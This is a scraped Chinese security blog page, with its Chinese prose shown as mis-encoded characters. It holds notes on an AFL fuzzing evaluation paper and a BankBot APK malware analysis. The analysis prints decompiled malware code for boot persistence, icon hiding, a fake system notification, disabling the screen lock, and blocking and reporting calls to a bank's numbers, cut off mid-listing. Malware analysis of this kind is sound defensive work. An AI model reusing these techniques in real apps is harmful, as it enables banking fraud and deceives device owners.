<p>æ²¹ç®¡ä¸Šæœ‰ç›¸å…³ videoï¼Œå¤§å®¶å¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š<br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=GDauxjx_bdA&amp;ab_channel=OneStutteringMind</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind">https://www.youtube.com/watch?v=qQ8DzumRZkM&amp;ab_channel=OneStutteringMind</a></p>
<h2 id="å†™åœ¨åé¢çš„è¯"><a href="#å†™åœ¨åé¢çš„è¯" class="headerlink" title="å†™åœ¨åé¢çš„è¯"></a>å†™åœ¨åé¢çš„è¯</h2><p>Logseq çš„åŠŸèƒ½è¿˜æ˜¯æŒºå¤šçš„ï¼Œä¸¤ç¯‡æ–‡ç« ä¹Ÿä¸å¯èƒ½å…¨éƒ¨ä»‹ç»å®Œï¼Œå®˜æ–¹æ–‡æ¡£æ€»æ˜¯æœ€å¥½çš„èµ„æ–™ï¼š<a target="_blank" rel="noopener" href="https://logseq.github.io/#/page/Contents">https://logseq.github.io/#/page/Contents</a></p>
<h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a target="_blank" rel="noopener" href="https://logseq.github.io/">https://logseq.github.io</a><br><a target="_blank" rel="noopener" href="https://www.usmacd.com/2022/02/21/logseq/">https://www.usmacd.com/2022/02/21/logseq/</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/03/04/afl-fuzz1/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/03/04/afl-fuzz1/" class="post-title-link" itemprop="url">Dissecting American Fuzzy Lop A FuzzBench Evaluation è¦ç‚¹</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-03-04 10:14:45" itemprop="dateCreated datePublished" datetime="2022-03-04T10:14:45+08:00">2022-03-04</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>paper: <a target="_blank" rel="noopener" href="https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf">https://www.s3.eurecom.fr/docs/fuzzing22_fioraldi_report.pdf</a></p>
<h2 id="ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench"><a href="#ä¸¤ä¸ªå®éªŒçš„ç»“è®º-ä¸»è¦åŸºäº-FuzzBench" class="headerlink" title="ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)"></a>ä¸¤ä¸ªå®éªŒçš„ç»“è®º (ä¸»è¦åŸºäº FuzzBench)</h2><ul>
<li>Our conclusion after this experiment is that AFL, and follow-ups fuzzers like AFL++, should provide an optionto disable hitcounts. AFL++ provides many different op-tions, and the users are suggested to run an instance of each variant when doing parallel fuzzing, a common use-case in real-world setups. The fact that in our experiments,hitcounts have shown a highly variadic behavior suggests that users should include a variant without hitcounts when doing parallel or ensemble fuzzing like OSS-Fuzz.</li>
<li>The conclusion we can draw from this experiment is that it would be a mistake to underestimate the impact of the novelty search. In particular, researchers proposing new approaches that also modify this aspect should care-fully evaluate â€“ in isolation â€“ the benefit of a different mechanism to decide if an input is interesting, as AFLâ€™s novelty search provides a strong baseline.</li>
</ul>
<h2 id="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯"><a href="#è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„-afl-fuzz-çš„ä¸€äº›æŠ€æœ¯" class="headerlink" title="è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯"></a>è®ºæ–‡ä¸­è®¡åˆ’è¦è¯„ä¼°çš„ afl-fuzz çš„ä¸€äº›æŠ€æœ¯</h2><ul>
<li><strong>Hitcounts</strong>: Hitcounts are adopted by other fuzzers to-day, but AFL was the first to introduce this concept.Despite its wide adoption, the impact of this optimization (overplain edge coverage) has never been measured in isolation on a large set of targets.</li>
<li><strong>Novelty search vs. maximization of a fitness</strong>: While AFL considers every new discovered hitcount as interesting, both other early fuzzing solutions and more recent tools instead only consider testcases that maximize a given metricas interesting. For instance, VUZZER uses the sum of all the weights of the executed basic blocks.<ul>
<li>In this experiment, we benchmark the AFL approach versusa fitness maximization and the combination of the two ap-proaches, as proposed by VUZZER</li>
<li>We expect the novelty search to outperforms both of the competing algorithms,</li>
</ul>
</li>
<li><strong>Corpus culling</strong>: The prioritization of the small and fast testcases in the AFL corpus selection algorithm trades speed with the fuzzing of more complex testcases that often corresponds to complex program states<ul>
<li>In this experiment, we want to assess the difference in using the AFL corpus culling mechanism versus using the entire corpus.</li>
<li>We expect faster growth in coverage over time and,potentially, more bugs triggered in the same time window</li>
</ul>
</li>
<li><strong>Score calculation</strong>: The performance score used to cal-culate how many times to mutate and execute the input in the havoc, and splice stages are derived from many variables,mainly testcase size and execution time<ul>
<li>In this experiment, we want to measure the delta between the AFL solution and the baseline, represented by a constantand a random score</li>
</ul>
</li>
<li><strong>Corpus scheduling</strong>: The FIFO policy used by AFL is only one of the possible policies that a fuzzer can adopt to select the next testcase<ul>
<li>Thus, we evaluate AFL versus a modified version that implements the baseline, random selection, and the opposite approach, a LIFO scheduler.</li>
</ul>
</li>
<li><strong>Splicing as stage vs. splicing as mutation</strong>: Splicing refers to the operation that merges two different testcases into a new one<ul>
<li>We modified the AFL codebase to implement splicing as a mutation operator to compare the two.</li>
</ul>
</li>
<li><strong>Trimming</strong>: Trimming the testcases allows the fuzzer to reduce the size of the input files and consequently give priority to small inputs, under the assumptions that large inputs introduce a slowdown in the execution and the mutations would be less likely to modify an important portion of the binary structure<ul>
<li>Despite the fact that this algorithm can bring the two important benefits described above, we argue that reducing the size of the testcases could lead to lose state coverage.Additionally, the trimming phase could become a bottleneck for slow targets</li>
<li>Therefore, in our evaluation we plan tocompare the default version of AFL against a modified one,where we disabled trimming</li>
</ul>
</li>
<li><strong>Collisions</strong>: As explained in section III-F the AFL ap-proach to instrument the source code of the target programs consists of assigning an identifier for each basic block at compile-time.<ul>
<li>We want to benchmark this feature as the collision-free variant is simpler than the original implementation with pc-guard, raising the question why random identifiers are used in AFL</li>
</ul>
</li>
</ul>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://usmacd.com/2022/02/22/BankBot/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="henices">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | å®‰å…¨ä»£ç ">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/02/22/BankBot/" class="post-title-link" itemprop="url">Bankbot APK æ ·æœ¬åˆ†æ</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-02-22 13:35:06" itemprop="dateCreated datePublished" datetime="2022-02-22T13:35:06+08:00">2022-02-22</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="0x00-æ ·æœ¬æ¦‚å†µ"><a href="#0x00-æ ·æœ¬æ¦‚å†µ" class="headerlink" title="0x00 æ ·æœ¬æ¦‚å†µ"></a>0x00 æ ·æœ¬æ¦‚å†µ</h2><table>
<thead>
<tr>
<th>å­—æ®µ</th>
<th>å†…å®¹</th>
</tr>
</thead>
<tbody><tr>
<td>æ ·æœ¬å</td>
<td>BankBot</td>
</tr>
<tr>
<td>MD5</td>
<td>3c42c391bec405bb28b28195c2961778</td>
</tr>
<tr>
<td>SHA256</td>
<td>93b64019ee48177889d908c393703a2a2fe05ca33793c14b175467ce619b1b94</td>
</tr>
<tr>
<td>æ–‡ä»¶ç±»å‹</td>
<td>APK</td>
</tr>
</tbody></table>
<p>è¿™æ˜¯ä¸€ä¸ªä»¥ç›—çªƒä¿¡ç”¨å¡ç”¨æˆ·å¯†ç ä¸ºä¸»è¦ç›®çš„çš„botã€‚å®‰è£…åæ˜¾ç¤ºä¸ºAndroidå›¾æ ‡ã€‚æ‰“å¼€Appå<br>ä¼šä»¥Androidç³»ç»Ÿæ›´æ–°çš„å½¢å¼ï¼Œè¯±å¯¼ç”¨æˆ·æ“ä½œè¾¾åˆ°å¸¸é©»ç³»ç»Ÿçš„ç›®çš„ã€‚</p>
<h2 id="0x01-è¡Œä¸ºåˆ†æ"><a href="#0x01-è¡Œä¸ºåˆ†æ" class="headerlink" title="0x01 è¡Œä¸ºåˆ†æ"></a>0x01 è¡Œä¸ºåˆ†æ</h2><h3 id="å¼€æœºè‡ªå¯åŠ¨"><a href="#å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="å¼€æœºè‡ªå¯åŠ¨"></a>å¼€æœºè‡ªå¯åŠ¨</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.android.market.Autorun&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;999&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span> <span class="attr">android:priority</span>=<span class="string">&quot;1000&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.REBOOT&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.BOOT_COMPLETED&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.action.QUICKBOOT_POWERON&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Autorun</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.android.market;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.BroadcastReceiver;</span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Autorun</span> <span class="keyword">extends</span> <span class="title class_">BroadcastReceiver</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Autorun</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(context, Scheduler.class);</span><br><span class="line">        v0.setFlags(<span class="number">0x10000000</span>);</span><br><span class="line">        context.startService(v0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¼€æœºå°†å¯åŠ¨ Schedule æœåŠ¡</p>
<h3 id="Schedule-æœåŠ¡"><a href="#Schedule-æœåŠ¡" class="headerlink" title="Schedule æœåŠ¡"></a>Schedule æœåŠ¡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">onStartCommand</span><span class="params">(Intent intent, <span class="type">int</span> flags, <span class="type">int</span> startId)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onStartCommand(intent, flags, startId);</span><br><span class="line">    Utils.registerIfNeeded(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="built_in">this</span>.getSystemService(<span class="string">&quot;alarm&quot;</span>);</span><br><span class="line">    <span class="type">PendingIntent</span> <span class="variable">v6</span> <span class="operator">=</span> PendingIntent.getBroadcast(((Context)<span class="built_in">this</span>), <span class="number">0</span>, <span class="keyword">new</span> <span class="title class_">Intent</span>(((Context)<span class="built_in">this</span>), </span><br><span class="line">            NetworkController.class), <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> <span class="variable">v7</span> <span class="operator">=</span> FileController.fileExists(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>) ? Integer.parseInt(FileController</span><br><span class="line">            .readFile(((Context)<span class="built_in">this</span>), <span class="string">&quot;interval&quot;</span>)) : <span class="number">0xA</span>;</span><br><span class="line">    ((AlarmManager)v0).setRepeating(<span class="number">0</span>, System.currentTimeMillis() + <span class="number">0x2710</span>, ((<span class="type">long</span>)(v7 * <span class="number">0x3E8</span>)), </span><br><span class="line">            v6);</span><br><span class="line">    <span class="built_in">this</span>.handleCrashes();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Schedule æœåŠ¡ä½¿ç”¨alarm manager æ³¨å†Œä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚è¿™ä¸ªå®šæ—¶ä»»åŠ¡ç”±NetworkControllerå®Œæˆã€‚<br>æ—¶é—´é—´éš”ç”±é…ç½®æ–‡ä»¶intervalå†³å®šã€‚</p>
<p>com.android.market.FileController</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">boolean</span> <span class="title function_">fileExists</span><span class="params">(Context context, String filename)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">File</span>(context.getFilesDir(), filename).exists();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="éšè—App-å›¾æ ‡"><a href="#éšè—App-å›¾æ ‡" class="headerlink" title="éšè—App å›¾æ ‡"></a>éšè—App å›¾æ ‡</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title function_">hideApp</span><span class="params">(Context context, <span class="type">boolean</span> hide)</span> &#123;</span><br><span class="line">    <span class="type">ComponentName</span> <span class="variable">v0</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(context.getPackageName(), String.valueOf(context.getPackageName())</span><br><span class="line">             + <span class="string">&quot;.MainActivity&quot;</span>);</span><br><span class="line">    <span class="type">PackageManager</span> <span class="variable">v3</span> <span class="operator">=</span> context.getPackageManager();</span><br><span class="line">    <span class="type">int</span> <span class="variable">v1</span> <span class="operator">=</span> hide ? <span class="number">2</span> : <span class="number">1</span>;</span><br><span class="line">    v3.setComponentEnabledSetting(v0, v1, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="ä¼ªé€ çš„ç³»ç»ŸNotification"><a href="#ä¼ªé€ çš„ç³»ç»ŸNotification" class="headerlink" title="ä¼ªé€ çš„ç³»ç»ŸNotification"></a>ä¼ªé€ çš„ç³»ç»ŸNotification</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate();</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">AppCrash</span>().Register(((Context)<span class="built_in">this</span>));</span><br><span class="line">    <span class="type">Notification</span> <span class="variable">v3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Notification</span>(<span class="number">0x108008A</span>, <span class="string">&quot;Android system requires user action&quot;</span>, System.</span><br><span class="line">            currentTimeMillis());</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>.getApplicationContext(), AdminX.class);</span><br><span class="line">    v1.setAction(<span class="string">&quot;android.intent.action.VIEW&quot;</span>);</span><br><span class="line">    v1.setFlags(<span class="number">0x34000000</span>);</span><br><span class="line">    v3.setLatestEventInfo(<span class="built_in">this</span>.getBaseContext(), <span class="string">&quot;Android&quot;</span>, <span class="string">&quot;Android system requires action&quot;</span>, PendingIntent</span><br><span class="line">            .getActivity(((Context)<span class="built_in">this</span>), <span class="number">0</span>, v1, <span class="number">0x8000000</span>));</span><br><span class="line">    v3.flags |= <span class="number">0x62</span>;</span><br><span class="line">    <span class="built_in">this</span>.startForeground(<span class="number">2</span>, v3);</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">Helper</span>(<span class="built_in">this</span>).execute(<span class="keyword">new</span> <span class="title class_">Void</span>[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h3 id="ç¦ç”¨å±å¹•é”å®š"><a href="#ç¦ç”¨å±å¹•é”å®š" class="headerlink" title="ç¦ç”¨å±å¹•é”å®š"></a>ç¦ç”¨å±å¹•é”å®š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdminX.<span class="built_in">this</span>.getSystemService(<span class="string">&quot;keyguard&quot;</span>).newKeyguardLock(<span class="string">&quot;ANDROID&quot;</span>).disableKeyguard();</span><br></pre></td></tr></table></figure>

<h3 id="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ‹¨æ‰“æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onReceive</span><span class="params">(Context context, Intent intent)</span> &#123;</span><br><span class="line">    String[] v8;</span><br><span class="line">    <span class="type">String</span> <span class="variable">action</span> <span class="operator">=</span> intent.getAction();</span><br><span class="line">    <span class="type">String</span> <span class="variable">v6</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v3</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;incoming_number&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v5</span> <span class="operator">=</span> intent.getStringExtra(<span class="string">&quot;android.intent.extra.PHONE_NUMBER&quot;</span>);</span><br><span class="line">    <span class="type">String</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">v9</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(action.equals(<span class="string">&quot;android.intent.action.NEW_OUTGOING_CALL&quot;</span>)) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> v5.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(</span><br><span class="line">                <span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(v1 != <span class="literal">null</span>) &#123;</span><br><span class="line">            v8 = v1.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(v8.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="type">int</span> v13;</span><br><span class="line">                <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(v4.contains(v8[v13])) &#123;</span><br><span class="line">                        v9 = <span class="number">1</span>;</span><br><span class="line">                        v11 = String.valueOf(v11) + <span class="string">&quot;blocked outgoing call&quot;</span>;</span><br><span class="line">                        <span class="built_in">this</span>.setResultData(<span class="literal">null</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(v9 == <span class="number">0</span>) &#123;</span><br><span class="line">            v11 = String.valueOf(v11) + <span class="string">&quot;outgoing call&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ReportWithDataTask</span>(context, <span class="string">&quot;call_data&quot;</span>).execute(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;[&quot;</span> + <span class="built_in">this</span>.toJSON(v4, </span><br><span class="line">                v11) + <span class="string">&quot;]&quot;</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  ...</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>é€šè¿‡ç½‘é¡µ <a target="_blank" rel="noopener" href="http://www.sberbank.com/news-and-media/contacts">http://www.sberbank.com/news-and-media/contacts</a> ä¸­çš„ä¿¡æ¯æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p>
<p>8005555550 4955005550 è¿™ä¸¤ä¸ªå·ç  sberbank çš„å·ç ï¼Œåœ¨ä¿„ç½—æ–¯æ‹¨æ‰“å…è´¹ã€‚</p>
<h3 id="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"><a href="#ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯" class="headerlink" title="ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯"></a>ç¦æ­¢æ¥å¬æŒ‡å®šå·ç ç”µè¯</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="string">&quot;8005555550; 4955005550;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((action.equals(<span class="string">&quot;android.intent.action.PHONE_STATE&quot;</span>)) &amp;&amp; (v6.equals(<span class="string">&quot;RINGING&quot;</span>))) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> v3 != <span class="literal">null</span> ? v3.replace(<span class="string">&quot;+&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;#&quot;</span>, <span class="string">&quot;d&quot;</span>).replace(<span class="string">&quot;*&quot;</span>, <span class="string">&quot;s&quot;</span>).replace(</span><br><span class="line">        <span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) : <span class="string">&quot;Unknown&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">    v8 = v10.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>).split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(v13 = <span class="number">0</span>; v13 &lt; v8.length; ++v13) &#123;</span><br><span class="line">        <span class="keyword">if</span>(v2.contains(v8[v13])) &#123;</span><br><span class="line">            v11 = <span class="string">&quot;blocked incoming call&quot;</span>;</span><br><span class="line">            v9 = <span class="number">1</span>;</span><br><span class="line">            <span class="built_in">this</span>.hangUp(context);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!v2.contains(<span class="string">&quot;Unknown&quot;</span>)) &#123;</span><br><span class="line">        goto label_106;</span><br><span 